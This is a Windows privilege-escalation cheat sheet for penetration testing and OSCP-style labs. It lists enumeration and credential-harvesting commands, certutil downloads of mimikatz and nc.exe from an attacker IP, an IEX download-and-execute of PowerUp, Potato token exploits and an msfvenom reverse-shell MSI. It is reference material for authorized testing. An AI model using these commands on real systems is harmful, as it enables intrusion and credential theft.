# Windows Privilege Escalation Playbook

Quick-reference checklist for hunting Windows privilege escalation paths, covering manual checks, automated tooling, and common exploits. Replace placeholders (`<target>`, `<user>`, `<password>`) as needed.

---

## Quick Triage Checklist
- Identify current user context and host: `whoami`, `hostname`
- Inspect group memberships for elevated rights: `whoami /groups`
- Enumerate local users and privileged groups: `net user`, `net localgroup administrators`
- Capture OS build, architecture, and patch level: `systeminfo`, `wmic os get osarchitecture`, `wmic qfe`
- Review network footprint: `ipconfig /all`, `route print`
- List installed applications and running processes: `wmic product get name,version`, `tasklist /v`
- **Command bundle for a fast snapshot:**
  ```powershell
  whoami; hostname; whoami /groups;
  net user; net localgroup administrators;
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version";
  wmic os get osarchitecture; wmic qfe get HotFixID,InstalledOn;
  ipconfig /all; route print; tasklist /v
  ```

---

## O. Transfer File
```bash
certutil -urlcache -split -f http://10.10.14.160:8080/winPEAsx64.exe
certutil -urlcache -split -f http://10.10.14.160:8080/mimikatz.exe
certutil -urlcache -split -f http://10.10.14.160:8080/PrintSpoofer.exe
certutil -urlcache -split -f http://10.10.14.160:8080/nc.exe

```

## 1. System Recon
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` – OS baseline for kernel/patch checks.
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` – Enumerate installed updates.
- `whoami /all` – Current user, groups, and privileges (look for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, etc.).
- `hostname` / `echo %COMPUTERNAME%` – Confirm host identity.
- `set` – Dump environment variables for credentials or unusual paths.
- `driverquery /v` – List drivers to identify vulnerable third-party components.
- `wevtutil qe System /c:10 /rd:true /f:text` – Recent system events (service crashes, policy changes).
- **Situational awareness command sweep:**
  ```powershell
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
  wmic qfe get Caption,Description,HotFixID,InstalledOn
  whoami /all
  driverquery /v
  wevtutil qe System /c:10 /rd:true /f:text
  ```

## 2. Account & Credential Recon
- `net user <username>` / `net user` – Local user enumeration.
- `net localgroup administrators` – Check local admin membership.
- `cmdkey /list` – Stored credentials.
- `vaultcmd /listcreds /all` – Credential Manager entries.
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` – Auto-logon creds.
- `findstr /spin "password" C:\Users\*` – Harvest clear-text secrets from user profiles.
- `findstr /spin /c:"pass" C:\*` – Broad search for files containing the literal string "pass".
- **Hidden-in-plain-view sweep (passwords, tokens, secrets):**
  ```powershell
  findstr /spin "password" C:\Users\*
  findstr /spin "token\|secret" C:\Users\*
  findstr /spin /c:"pass" C:\*
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  cmdkey /list
  vaultcmd /listcreds /all
  ```

## 3. Service & Driver Abuse
- `sc query state= all` – Enumerate services and states.
- `sc qc <service>` – Inspect service configuration (binary path, run-as account).
- `wmic service get name,displayname,startmode,startname` – Identify auto-start services running as SYSTEM.
- Check for unquoted service paths; note writable directories in the path.
- `accesschk.exe -uwcqv "Authenticated Users" * /accepteula` – Detect writable service binaries.
- Driver vulnerabilities: cross-reference `driverquery` output with exploit DB (e.g., CVE-2018-0952).

## 4. Scheduled Tasks & Startup
- `schtasks /query /fo LIST /v` – Look for high-priv tasks with modifiable actions.
- `dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` – Startup folder abuse.
- Inspect `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` for writable autoruns.

## 5. Registry & Permission Weaknesses
- `reg query HKLM\SOFTWARE\Policies /s` – Misconfigured policies.
- `icacls "C:\Program Files"` – Find writable directories under Program Files.
- `Get-Acl` via PowerShell on critical paths (`C:\Windows\System32`, service binaries) to spot misperms.
- `reg query HKLM\SYSTEM\CurrentControlSet\Services /s | findstr /i "ImagePath"` – Review service ImagePaths for suspicious locations.
- **Interpreting key `icacls` flags:**  
  `F` (Full Control), `M` (Modify), `(W)` (Write), `(OI)` (Object Inherit), `(CI)` (Container Inherit). If low-privileged principals such as `BUILTIN\Users`, `Authenticated Users`, or `Everyone` hold `F`, `M`, or `(W)` on service binaries or directories, the path is likely exploitable.

## 6. Token & Privilege Abuse
- `whoami /priv` – Confirm user privileges.
- If SeImpersonatePrivilege present: deploy `PrintSpoofer`, `GodPotato`, or JuicyPotato.
- With SeAssignPrimaryTokenPrivilege: use `PsExec` or `incognito` to assign new tokens.
- With SeBackupPrivilege: use `diskshadow` + `ntdsutil` for AD database/download.

## 7. UAC & Logon Tricks
- `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` – Determine UAC level.
- Test non-elevated processes for auto-elevate (fodhelper, sdclt, eventvwr) if UAC is misconfigured.
- `query user` – Identify interactive admins for impersonation opportunities.

## 8. Using PowerUp.ps1
- Import PowerUp: `powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"`
- Key functions:
  - `Invoke-AllChecks` – Comprehensive audit of services, reg keys, creds.
  - `Get-ServiceUnquoted` / `Get-ModifiableServiceFile` – Service path exploits.
  - `Get-ModifiableScheduledTaskFile` – Writable scheduled tasks.
  - `Get-RegistryAlwaysInstallElevated` – MSI elevated install misconfigs.
  - `Invoke-ServiceAbuse -Name <service>` – Automatically reconfigure vulnerable services.

## 9. Automated Scanners & Scripts
- `winPEAS.exe /quiet` – Broad privilege escalation discovery.
- `Seatbelt.exe -group=all` – Quick situational awareness.
- `SharpUp.exe` – C# alternative for Windows priv-esc checks.
- `Jaws-enum.ps1` – PowerShell info-gathering script.
- `wesng <systeminfo_output.txt>` – Windows Exploit Suggester Next-Gen.

## 10. Common Priv-Esc Exploits
- **Potato Family (SeImpersonate/AssignPrimary tokens)**
  - PrintSpoofer64: `PrintSpoofer64.exe -i -c cmd.exe`
  - GodPotato: `GodPotato.exe -cmd "cmd.exe"`
  - JuicyPotatoNG: `JuicyPotatoNG.exe -l 1337 -c "{CLSID}" -p "C:\Windows\System32\cmd.exe"`
- **Service Binary Replacement**
  - Stop vulnerable service → replace executable with payload → start service.
- **Unquoted Service Path**
  - Place payload in path (e.g., `C:\Program Files\Vuln Service\program.exe`) and restart service.
- **AlwaysInstallElevated**
  - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  - `msfvenom -p windows/x64/shell_reverse_tcp -f msi` and run MSI to escalate.
- **DLL Hijacking**
  - Monitor loading DLLs via `Process Monitor` or `ListDLLs` → drop malicious DLL in writable directory.
- **Kernel Exploits**
  - Cross-reference build with exploit suggester (e.g., `PowerUp`, `wesng`) and deploy CVE-specific exploit like `CVE-2019-1388`.

## 11. Persistence & Verification
- After escalation, confirm with `whoami /groups` and `net session`.
- Locate OSCP flag files to document proof: `dir /s C:\*local.txt`, `dir /s C:\*proof.txt`
- Document exploited vector, commands, and files modified.
- Remove tooling and restore service order if required by engagement scope.

---

### Useful Download Links
- PowerUp.ps1: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
- winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- PrintSpoofer: https://github.com/dievus/printspoofer
- GodPotato: https://github.com/BeichenDream/GodPotato
- JuicyPotatoNG: https://github.com/ohpe/juicy-potato
- Windows Exploit Suggester NG: https://github.com/bitsadmin/wesng
- Seatbelt: https://github.com/GhostPack/Seatbelt
- Kerbrute https://github.com/ropnop/kerbrute
